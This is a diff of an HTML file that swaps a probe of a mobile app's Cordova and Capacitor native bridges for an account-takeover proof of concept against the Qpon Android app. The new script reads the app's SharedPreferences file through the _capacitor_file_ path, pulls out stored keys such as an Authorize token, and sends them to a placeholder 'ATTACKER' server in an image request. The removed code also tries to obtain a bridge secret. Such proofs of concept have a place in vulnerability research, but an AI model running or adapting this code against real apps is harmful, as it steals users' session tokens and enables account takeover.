@@ -1,90 +1,54 @@
-<html>
-<head><title>Qpon</title></head>
-<body>
+<html><head><title>Qpon</title></head><body>
 <pre id="log"></pre>
 <script>
 var L=document.getElementById("log");
-function log(s){L.textContent+=s+"\n";console.log(s)}
+function log(s){L.textContent+=s+"\n"}
 
-log("=== Bridge Enumeration ===");
-log("domain: "+document.domain);
-log("origin: "+window.location.origin);
+log("=== Qpon ATO PoC ===");
+log("Phase 1: Reading SharedPreferences via _capacitor_file_");
 
-// Check ALL known interfaces
-var bridges={
-  "androidBridge":window.androidBridge,
-  "androidBridge.postMessage":window.androidBridge&&window.androidBridge.postMessage,
-  "_cordovaNative":window._cordovaNative,
-  "_cordovaNative.exec":window._cordovaNative&&window._cordovaNative.exec,
-  "_cordovaNative.retrieveJsMessages":window._cordovaNative&&window._cordovaNative.retrieveJsMessages,
-  "_cordovaNative.setNativeToJsBridgeMode":window._cordovaNative&&window._cordovaNative.setNativeToJsBridgeMode,
-  "CapacitorCookiesAndroidInterface":window.CapacitorCookiesAndroidInterface,
-  "CapacitorCookiesAndroidInterface.setCookie":window.CapacitorCookiesAndroidInterface&&window.CapacitorCookiesAndroidInterface.setCookie,
-  "CapacitorCookiesAndroidInterface.isEnabled":window.CapacitorCookiesAndroidInterface&&window.CapacitorCookiesAndroidInterface.isEnabled,
-  "CapacitorHttpAndroidInterface":window.CapacitorHttpAndroidInterface,
-  "CapacitorHttpAndroidInterface.isEnabled":window.CapacitorHttpAndroidInterface&&window.CapacitorHttpAndroidInterface.isEnabled,
-};
+var target = "https://localhost/_capacitor_file_/data/data/com.qpon.platform/shared_prefs/CapacitorStorage.xml";
 
-for(var k in bridges){
-  var v=bridges[k];
-  var t=typeof v;
-  if(v&&t==="function"){log("[CALLABLE] "+k+" = "+t)}
-  else if(v&&t==="object"){log("[OBJECT]   "+k+" = "+t)}
-  else{log("[MISSING]  "+k)}
-}
+fetch(target)
+  .then(function(r) {
+    log("Status: " + r.status);
+    log("Content-Type: " + r.headers.get("content-type"));
+    return r.text();
+  })
+  .then(function(xml) {
+    log("\nPhase 2: SharedPreferences content:");
+    log(xml);
 
-// Call anything that's available
-try{
-  var ce=window.CapacitorCookiesAndroidInterface.isEnabled();
-  log("\nCookies.isEnabled() = "+ce);
-}catch(e){log("Cookies.isEnabled: "+e.message)}
+    // Parse the XML to extract Authorize token
+    var parser = new DOMParser();
+    var doc = parser.parseFromString(xml, "text/xml");
+    var strings = doc.querySelectorAll("string");
+    var stolen = {};
 
-try{
-  var he=window.CapacitorHttpAndroidInterface.isEnabled();
-  log("Http.isEnabled() = "+he);
-}catch(e){log("Http.isEnabled: "+e.message)}
-
-// Try _cordovaNative.exec with secret=0 to see error type
-try{
-  var r=window._cordovaNative.exec(0,"Preferences","get","t1",'[{"key":"Authorize"}]');
-  log("\n_cordovaNative.exec(0,...) = "+r);
-}catch(e){log("_cordovaNative.exec(0,...): "+e.message)}
-
-// Try gap_init via prompt to get bridge secret
-try{
-  var secret=prompt("","gap_init:1");
-  log("\ngap_init result: "+JSON.stringify(secret));
-  if(secret&&secret!==""){
-    log("SECRET OBTAINED: "+secret);
-    // Try exec with obtained secret
-    var s=parseInt(secret);
-    var r2=window._cordovaNative.exec(s,"Preferences","get","t2",'[{"key":"Authorize"}]');
-    log("exec with secret: "+r2);
-  }
-}catch(e){log("gap_init: "+e.message)}
-
-// Scan all window properties for any other bridge
-log("\n=== Window Object Scan ===");
-var found=[];
-for(var p in window){
-  try{
-    var o=window[p];
-    if(o&&typeof o==="object"&&o!==window&&o!==document&&o!==navigator&&o!==location&&o!==history){
-      var s=String(o);
-      if(s==="[object Object]"){
-        var ms=[];
-        for(var m in o){if(typeof o[m]==="function")ms.push(m)}
-        if(ms.length>0&&ms.length<15){
-          found.push(p+": "+ms.join(","));
-          log("[BRIDGE?] window."+p+" → "+ms.join(", "));
-        }
-      }
+    for (var i = 0; i < strings.length; i++) {
+      var key = strings[i].getAttribute("name");
+      var val = strings[i].textContent;
+      stolen[key] = val;
+      log("\n[STOLEN] " + key + " = " + val.substring(0, 80) + (val.length > 80 ? "..." : ""));
     }
-  }catch(e){}
-}
-if(!found.length)log("No unknown bridge objects found");
 
-log("\n=== Done ===");
-</script>
-</body>
-</html>
+    // Exfiltrate
+    log("\nPhase 3: Exfiltrating...");
+    new Image().src = "https://ATTACKER/steal?d=" + encodeURIComponent(JSON.stringify(stolen));
+    log("DONE — tokens sent to attacker server");
+  })
+  .catch(function(e) {
+    log("fetch error: " + e.message);
+
+    // Fallback: try XHR
+    log("\nTrying XHR fallback...");
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", target, true);
+    xhr.onload = function() {
+      log("XHR status: " + xhr.status);
+      log("XHR response:\n" + xhr.responseText);
+    };
+    xhr.onerror = function() { log("XHR error") };
+    xhr.send();
+  });
+</script></body></html>
